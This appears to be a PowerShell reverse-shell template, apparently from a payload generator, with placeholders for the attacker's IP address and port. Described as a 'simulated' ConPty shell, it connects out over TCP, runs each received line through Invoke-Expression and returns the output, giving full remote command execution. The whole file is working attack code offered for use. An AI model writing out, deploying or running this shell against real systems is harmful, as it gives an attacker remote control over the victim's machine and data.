# PowerShell ConPty Shell (Simulated)
# This script initiates a connection and spawns a simulated pseudo-console
$ip = "{{ ip }}"
$port = {{ port }}

$client = New-Object System.Net.Sockets.TcpClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

$writer.WriteLine("Connected to ConPty Shell")
$writer.Flush()

while ($client.Connected) {
    while ($stream.DataAvailable) {
        $cmd = $reader.ReadLine()
        if ($cmd -eq "exit") { $client.Close(); return }
        
        # Execute with simulated TTY context (basic)
        # Real ConPty requires C# P/Invoke or external binaries (e.g. conpty.exe)
        # Here we simulate by invoking standard shell but hinting at PTY capabilities
        $output = Invoke-Expression $cmd 2>&1 | Out-String
        $writer.WriteLine($output)
        $writer.Flush()
    }
    Start-Sleep -Milliseconds 100
}
